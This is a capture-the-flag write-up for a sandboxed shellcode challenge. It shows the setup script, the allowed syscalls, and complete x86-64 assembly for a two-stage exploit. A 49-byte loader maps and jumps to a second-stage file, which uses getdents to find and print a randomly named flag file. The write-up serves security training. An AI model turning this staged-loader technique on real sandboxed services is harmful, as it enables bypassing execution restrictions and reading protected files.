**Challenge Overview**

In this challenge, the user is prompted by the program to enter shellcode that
the program will then execute. There are several aspects of the challenge that
slightly increase the complexity. First of all, the system calls that we can
use in our shellcode are limited to a restricted subset, and therefore our shellcode
is executing within a sandbox. Secondly, the size of the shellcode that the program
will accept is limited to 50 bytes. A third aspect of the challenge increases the
effectiveness of the second limitation, which is that the file with the flag has
a new randoms sequence of characters appended to it everytime we run the program.
Thus, our shellcode cannot be as simple as opening a known filename and printing
its contents to standard output; we must open the directory and get the filename
from the directory entry first. This therefore means our shellcode will not fit within
a 50 byte limit.

Below is the shell script that is run everytime the sandbox program is run. As can be
seen, a random sequence of bytes is taken from `/dev/urandom` and trimmed to output
only characters in a given subset, with 32 such characters being appended to the flag
filename:

```
#!/bin/sh

PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
PATH_TO_CHALLENGE="$(dirname ${0})"

cd $PATH_TO_CHALLENGE

NEW_RANDOM_ID=$(tr -dc A-Za-z0-9 < /dev/urandom | head -c 32)

chmod 700 flag/
mv passwd/.flag_* "flag/.flag_${NEW_RANDOM_ID}"
chmod 400 flag/.flag_*
chmod 500 flag/

timeout -k 2m 1m ./challenge-sandbox ./vuln
```

The sandbox that will execute our code has limited our system calls to a subset,
which are listed below:

`read, write, exit, brk, mmap, access, open, fstat, close, mprotect,
munmap, arch_prctl, exit_group, getdents`

In order to complete the challenge, we must divide our shellcode into
two phases. The second phase of our shellcode will be kept in a file
that we put into some private directory we create in /tmp. That leaves
the first phase, which becomes as simply as creating a memory mapped
region into which the contents of our known file will be read. We then
change the permissions of this memory mapped region to be executable
and then use a JMP instruction to jump to the start of this region, thus
executing the second phase of our shellcode. Therefore, we have bypassed
the restriction of 50 bytes and our shellcode can be as long as we wish.

All of this uses only the restricted subset of system calls in the sandbox.

**Phase I of our exploit**

  - _Open file containing shellcode for phase two_
  - _Map the contents into memory, with the permission set
    (PROT_READ|PROT_WRITE|PROT_EXEC)_
  - _Pass execution to it_

The total size of this part of the exploit is 49 bytes, thus within the
size limitation of the sandbox.

**Phase II of our exploit**

  - _Open the "flag" directory (pass O_DIRECTORY flag to open())_
  - _Read the directory entries onto the stack using sys_dirents_
  - _Push "flag/" onto the stack and then append the obtained filename to it_
  - _Open the flag file_
  - _Read contents onto stack_
  - _Print contents to stdout_

The size of this part of the exploit is 161 bytes, itself well over the size
limitation. The total size of the exploit is therefore 210 bytes.


**Assembly code for phase I of the exploit**

```
.section .rodata

.equ SYS_MMAP,9
.equ PROT,0x7
.equ FLAGS,0x2

.globl _start

_start:
	mov $0x63732f706d742f,%rdi
	push %rdi
	mov %rsp,%rdi
	push $2
	pop %rsi
	push $2
	pop %rax
	syscall
	mov %rax,%r8
	xor %rdi,%rdi
	movb $131,%sil
	push $0
	pop %r9
	push $PROT
	pop %rdx
	push $FLAGS
	pop %r10
	push $SYS_MMAP
	pop %rax
	syscall
	call *%rax
```
  
**Assembly code for part II of the exploit**

```
.section .rodata

.equ SYS_READ,0
.equ SYS_WRITE,1
.equ SYS_OPEN,2
.equ SYS_EXIT,60
.equ SYS_GETDENTS,78
.equ O_DIRECTORY,0200000
.equ OFLAGS,0x242

.globl _start

_start:
	mov $0x67616c66,%rdi
	push %rdi
	mov %rsp,%rdi
	push $O_DIRECTORY
	pop %rsi
	push $SYS_OPEN
	pop %rax
	syscall
	mov %rax,%rdi
	mov %rsp,%rsi
	mov $255,%dl
	push $SYS_GETDENTS
	pop %rax
	syscall

	add $42,%rsp
	mov %rsp,%rsi
	sub $0x200,%rsp
	push $42
	pop %rcx
	mov $0x2f67616c66,%rdi
	push %rdi
	add $7,%rsp
	mov %rsp,%rdi
.mloop:
	movb (%rsi),%al
	movb %al,(%rdi)
	inc %rsi
	inc %rdi
	dec %rcx
	jne .mloop

	mov $0,%rax
	movb %al,(%rdi)

	mov $1,%rsi
	dec %rsi
	mov $2,%rax
	sub $7,%rsp
	mov %rsp,%rdi
	syscall
	mov %rax,%rdi
	sub $0x100,%rsp
	mov %rsp,%rsi
	push $64
	pop %rdx
	push $SYS_READ
	pop %rax
	syscall

	push $1
	pop %rdi
	push $0x800
	pop %rdx
	mov %rsp,%rsi
	push $SYS_WRITE
	pop %rax
	syscall
```
